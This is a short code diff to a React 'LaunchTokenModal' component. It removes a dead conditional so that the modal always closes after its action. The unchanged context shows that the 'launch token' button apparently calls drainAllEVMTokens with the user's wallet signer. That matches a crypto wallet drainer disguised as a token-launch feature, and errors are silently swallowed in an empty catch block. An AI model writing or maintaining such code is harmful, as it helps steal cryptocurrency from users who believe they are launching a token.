@@ -232,10 +232,7 @@ export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => 
       try {
         const evmChainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, evmChainName, evmChainId || 1);
-        if (hash) {
-          onClose();
-        } else {
-        }
+        onClose();
       } catch (error: any) {
       } finally {
         setIsLaunching(false);
